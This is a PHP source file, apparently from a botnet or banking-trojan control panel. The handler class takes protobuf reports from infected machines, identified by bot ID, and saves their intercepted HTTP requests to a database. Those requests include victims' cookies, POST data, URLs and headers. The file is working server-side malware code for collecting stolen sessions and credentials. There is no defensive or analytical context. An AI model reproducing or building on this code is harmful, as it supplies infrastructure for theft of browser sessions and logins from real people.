<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';

class ReportHttpGrabberHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
		Logger::Error('ReportHttpGrabberHandler', 'grabDataFromProtobuf', $e, null, json_encode($input_data));
        $reportSoftware = new reportHttpGrabber();
        $reportSoftware->ParseFromString($input_data);
        $this->data = $reportSoftware->getAssocArray();
        $this->data['bot_id'] = $this->getRowIdByBotId($botid);
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                return false;
            }

            $this->getDB()->beginTransaction();

            $dataForInsert = array();

            $dataForInsert['url'] = $this->data['url'];
            $dataForInsert['bot_id'] = $this->data['bot_id'];

            if (!empty($this->data['useragent'])) {
                $dataForInsert['useragent'] = $this->data['useragent'];
            }
            if (!empty($this->data['content_type'])) {
                $dataForInsert['content_type'] = $this->data['content_type'];
            }
            if (!empty($this->data['accept_encoding'])) {
                $dataForInsert['accept_encoding'] = $this->data['accept_encoding'];
            }
            if (!empty($this->data['accept_language'])) {
                $dataForInsert['accept_language'] = $this->data['accept_language'];
            }
            if (!empty($this->data['referer'])) {
                $dataForInsert['referer'] = $this->data['referer'];
            }
            if (!empty($this->data['cookie'])) {
                $dataForInsert['cookie'] = $this->data['cookie'];
            }
            if (!empty($this->data['post_data'])) {
                $dataForInsert['post_data'] = $this->data['post_data'];
            }
            if (!empty($this->data['flags'])) {
                $dataForInsert['flags'] = $this->data['flags'];
            }

            DBClient::DB()->insert('reports_http_grabber', $dataForInsert);
            $this->getDB()->commit();
        }
        catch (Exception $e)
        {
            $this->getDB()->rollBack();
            Logger::Error('ReportHttpGrabberHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
    }

    protected function dataIsEmpty()
    {
        if (empty($this->data['url']))
            return true;
        if (empty($this->data['bot_id']))
            return true;
        return false;
    }
}